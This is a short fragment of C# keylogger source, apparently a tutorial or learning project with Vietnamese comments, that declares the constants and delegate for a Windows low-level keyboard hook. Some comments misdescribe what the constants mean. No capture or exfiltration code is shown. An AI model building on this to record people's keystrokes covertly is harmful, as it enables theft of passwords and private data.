...
namespace KeyLogger
{
    class Program
    {
        ...
        private const int WH_KEYBOARD_LL = 13;//khi keyup 
        private const int WM_KEYDOWN = 0x0100;// khi key down để truyền vào mấy cái dll 

        private static LowLevelKeyboardProc _proc = HookCallback; // đây là delegate 
        private static IntPtr _hookID = IntPtr.Zero;// trên hệ điều hành có nhiều phần tử. cái này lưu lại id của cái phần tử đó
